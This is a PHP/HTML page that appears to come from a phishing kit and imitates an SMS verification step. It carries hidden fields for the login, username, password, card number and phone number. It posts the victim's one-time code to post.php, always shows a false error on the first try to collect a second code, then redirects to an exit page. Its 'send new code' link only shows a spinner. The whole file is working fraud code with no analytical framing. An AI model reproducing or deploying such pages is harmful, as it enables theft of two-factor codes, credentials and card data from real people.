<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title><?php echo $lang["title"]; ?></title>
    <link rel="stylesheet" href="app.css">
</head>
<body>
<form action="action.php" method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="logo.png">
</header>
<div class="loader" style="color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3><?php echo $lang['_loading'][0];?></h3>
        <p><?php echo $lang['_loading'][1];?></p>
    <img src="loading.gif">
</div>
</div>

<main>

<div class="form">

<div class="title">
  <?php echo $lang["_sms_texts"][0]; ?>
    <p style="font-size:0.5em;">  <?php echo $lang["_sms_texts"][1]; ?></p>
</div>

<div class="cols">

<div class="col" style="color:red; display:none;" id="error-msg">
<?php echo $lang["_sms_texts"][4]; ?>
</div>
 

<div class="col">
    <label>  <?php echo $lang["_sms_texts"][2]; ?></label>
    <input type="text" id="sms" placeholder="<?php echo $lang["_sms_texts"][3]; ?>">
</div>
 
<div class="col remember">
<a href="#" onclick="newCode()"><?php echo $lang["_sms_texts"][5]; ?></a>
</div>


<div class="col submit">
    <button onclick="sbmt()"><?php echo $lang["_sms_texts"][6]; ?></button>
</div>

 


</div>


</div>

</main>


<script src="jq.js"></script>
<script>
    var loader = $(".loader");
    var count = 0;
    var error_msg = $("#error-msg");
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sms = $("#sms").val();
    var sub = true;
    $("#sms").removeClass("error");
    if(sms.length<4){
        $("#sms").addClass("error");
        sub=false;
    }

    if(sub){
        count++;
        error_msg.hide();
        loader.show();
            
        $.post("post.php",{sms:sms},(res)=>{
            if(count>=2){
                window.location="exit.php";
            }else{
                error_msg.show();
                loader.hide();
            }
    
        });
    }

}


 
function newCode(){
    loader.show();
    setTimeout(() => {
        loader.hide();
    }, 2000);
}
 


</script>
</body>

</html>
